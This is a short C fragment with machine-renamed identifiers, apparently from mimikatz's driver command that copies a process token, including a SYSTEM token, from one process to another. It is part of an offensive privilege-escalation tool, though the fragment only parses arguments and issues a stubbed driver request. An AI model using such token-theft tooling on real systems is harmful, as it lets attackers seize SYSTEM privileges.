
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef int wchar_t ;
struct TYPE_3__ {void* toProcessId; void* fromProcessId; int member_1; int member_0; } ;
typedef int PCWCHAR ;
typedef int NTSTATUS ;
typedef TYPE_1__ MIMIDRV_PROCESS_TOKEN_FROM_TO ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (char*,...) ;
 int FUNC_1 (int ,TYPE_1__*,int) ;
 scalar_t__ FUNC_2 (int,int **,char*,int *,int *) ;
 void* FUNC_3 (int ,int *,int ) ;

NTSTATUS FUNC_4(int VAR_2, wchar_t * VAR_3[])
{
 MIMIDRV_PROCESS_TOKEN_FROM_TO VAR_4 = {0, 0};
 PCWCHAR VAR_5, VAR_6;

 if(FUNC_2(VAR_2, VAR_3, L"from", &VAR_5, ((void*)0)))
  VAR_4.fromProcessId = FUNC_3(VAR_5, ((void*)0), 0);

 if(FUNC_2(VAR_2, VAR_3, L"to", &VAR_6, ((void*)0)))
  VAR_4.toProcessId = FUNC_3(VAR_6, ((void*)0), 0);

 FUNC_0(L"Token from process %u to process %u\n", VAR_4.fromProcessId, VAR_4.toProcessId);
 if(!VAR_4.fromProcessId)
  FUNC_0(L" * from 0 will take SYSTEM token\n");
 if(!VAR_4.toProcessId)
  FUNC_0(L" * to 0 will take all \'cmd\' and \'mimikatz\' process\n");

 FUNC_1(VAR_0, &VAR_4, sizeof(MIMIDRV_PROCESS_TOKEN_FROM_TO));

 return VAR_1;
}
